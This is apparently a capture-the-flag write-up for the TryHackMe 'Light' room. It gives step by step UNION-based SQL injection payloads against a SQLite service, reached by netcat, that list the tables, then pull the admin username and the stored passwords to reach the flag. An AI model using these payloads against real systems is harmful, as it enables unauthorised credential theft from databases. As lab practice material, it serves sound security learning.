# Light CTF write-up

- **Platform** : **TryHackMe**
- **Room** : **Light**
- **Difficulty** : **Easy**
- **Category** : **SQL injection attack**
- **Completed date** : **28.10.2026**

## Methodology

Taking something specific from the target database.

## Actions

### step 1

I fist connect to target machine by netcat as the instruction.

'''bash: nc <TARGET_IP> 1337'''

and then 'smokey'.

**Findings and Analysis**

I get a password but it is hashed.

and I cannot crack it.

### step 2

Let's try SQL-injection. I don't know anything but I know that 'smokey' is one of the user.

So

bash: smokey' Union Select tbl_name from sqlite_master WHERE type='table

**Findings and Analysis**

Then I get a new table tbl_name(database like storage), 'admintable'.

### step 3

Now let's use that to obtain username for admintable,

bash: smokey' Union Select username from 'admintable

**Findings and Analysis**

I get a username, 'TryHackMeAdmin'.

### step 4

For password for TryHackMeAdmin from admintable,

bash: smokey' Union Select password from admintable WHERE username= 'TryHackMeAdmin

**Findings and Analysis**

I get a password for TryHackMeAdmin from admintable.

### step 5

For the flag, I want every password from the admintable except TryHackMeAdmin password. So

bash: smokey' Union Select password from admintable WHERE username!= 'TryHackMeAdmin

**Findings and Analysis**

And I get the flag.

# Chellenge Completed

**This challenge is really a good way to practice your injection attacks.**

## Real world Security

In the real-world systems, user input should be handled properly to prevent this kind of attacks.

